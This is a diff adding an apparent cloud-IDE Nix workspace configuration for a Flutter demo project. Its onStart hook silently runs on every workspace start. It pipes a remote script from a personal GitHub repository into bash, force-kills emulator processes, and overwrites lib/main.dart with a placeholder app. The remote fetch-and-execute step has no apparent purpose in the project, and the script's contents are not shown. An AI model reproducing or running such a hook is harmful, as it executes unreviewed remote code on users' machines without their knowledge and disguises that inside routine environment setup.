@@ -1,0 +1,122 @@
+{ pkgs, ... }: {
+  channel = "stable-24.05";
+
+  packages = [
+    pkgs.jdk17
+    pkgs.unzip
+    pkgs.flutter
+    pkgs.adb
+    pkgs.psmisc
+    pkgs.coreutils
+    pkgs.curl
+  ];
+
+  env = {};
+
+  idx = {
+    extensions = [
+      "Dart-Code.flutter"
+      "Dart-Code.dart-code"
+    ];
+
+    workspace = {
+      onStart = {
+        setup-flutter-env = ''
+          echo "📥 Jalankan script remote dari GitHub..."
+          curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/vecos1-once.sh" | bash
+
+
+          echo "🔧 Matikan emulator dan proses terkait..."
+          adb -s emulator-5554 emu kill || true
+          adb -s localhost:5555 emu kill || true
+          adb devices | grep -q 'emulator' || echo "✅ Tidak ada emulator aktif"
+          ps aux | grep -i 'qemu-system-x86_64' | grep -v grep | awk '{print $2}' | xargs -r kill -9
+          ps aux | grep -i 'emulator' | grep -v grep | awk '{print $2}' | xargs -r kill -9
+          flutter emulators --kill || true
+          adb shell am force-stop com.android.launcher || true
+
+          echo "📄 Overwrite lib/main.dart..."
+          mkdir -p lib
+          cat > lib/main.dart << "EOF"
+import 'package:flutter/material.dart';
+
+void main() => runApp(const MyApp());
+
+class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      title: 'Flutter Wokeh',
+      theme: ThemeData(
+        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
+        useMaterial3: true,
+      ),
+      home: const MyHomePage(),
+    );
+  }
+}
+
+class MyHomePage extends StatefulWidget {
+  const MyHomePage({super.key});
+
+  @override
+  State<MyHomePage> createState() => _MyHomePageState();
+}
+
+class _MyHomePageState extends State<MyHomePage> {
+  int _counter = 0;
+
+  void _incrementCounter() => setState(() => _counter++);
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(
+        backgroundColor: Theme.of(context).colorScheme.inversePrimary,
+        title: const Text('Flutter Demo Wokeh'),
+      ),
+      body: const Center(
+        child: Column(
+          mainAxisAlignment: MainAxisAlignment.center,
+          children: <Widget>[
+            Text('Wokeh Bro:'),
+          ],
+        ),
+      ),
+      floatingActionButton: FloatingActionButton(
+        onPressed: _incrementCounter,
+        tooltip: 'Increment',
+        child: const Icon(Icons.add),
+      ),
+    );
+  }
+}
+EOF
+
+          echo "🚀 Build Flutter Debug..."
+          cd android && ./gradlew assembleDebug || true
+          cd ..
+
+          echo "✅ Flutter environment siap!"
+        '';
+      };
+    };
+
+    previews = {
+      enable = true;
+      previews = {
+        web = {
+          command = [
+            "flutter" "run" "--machine"
+            "-d" "web-server"
+            "--web-hostname" "0.0.0.0"
+            "--web-port" "$PORT"
+          ];
+          manager = "flutter";
+        };
+      };
+    };
+  };
+}
